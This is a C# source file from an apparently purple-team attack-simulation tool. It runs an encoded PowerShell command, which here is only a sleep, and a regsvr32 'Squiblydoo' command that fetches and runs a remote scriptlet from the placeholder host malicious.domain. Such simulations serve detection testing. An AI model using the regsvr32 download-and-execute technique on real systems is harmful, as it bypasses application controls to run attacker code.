using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace PurpleSharp.Simulations
{
    class Execution
    {
        static public void ExecutePowershell(string log)
        {
            string currentPath = AppDomain.CurrentDomain.BaseDirectory;
            Lib.Logger logger = new Lib.Logger(currentPath + log);
            logger.TimestampInfo(String.Format("Starting T1086 Simulation on {0}", Environment.MachineName));
            logger.TimestampInfo(String.Format("Simulation agent running as {0} with PID:{1}", System.Reflection.Assembly.GetEntryAssembly().Location, Process.GetCurrentProcess().Id));
            try
            {
                string encodedPwd = "UwB0AGEAcgB0AC0AUwBsAGUAZQBwACAALQBzACAAMgAwAA==";
                ExecutionHelper.StartProcess3("", String.Format("powershell.exe -enc {0}", encodedPwd), logger);
                logger.SimulationFinished();
            }
            catch
            {
                logger.SimulationFailed();
            }
            
        }

        static public void ExecuteRegsvr32(string log)
        {
            string currentPath = AppDomain.CurrentDomain.BaseDirectory;
            Lib.Logger logger = new Lib.Logger(currentPath + log);
            logger.TimestampInfo(String.Format("Starting T1117 Simulation on {0}", Environment.MachineName));
            logger.TimestampInfo(String.Format("Simulation agent running as {0} with PID:{1}", System.Reflection.Assembly.GetEntryAssembly().Location, Process.GetCurrentProcess().Id));
            try
            {
                string url = @"http://malicious.domain:8080/payload.sct";
                string dll = "scrobj.dll";
                ExecutionHelper.StartProcess3("", String.Format("regsvr32.exe /u /n /s /i:{0} {1}", url, dll), logger);
                logger.SimulationFinished();
            }
            catch
            {
                logger.SimulationFailed();
            }
            
        }

    }
}
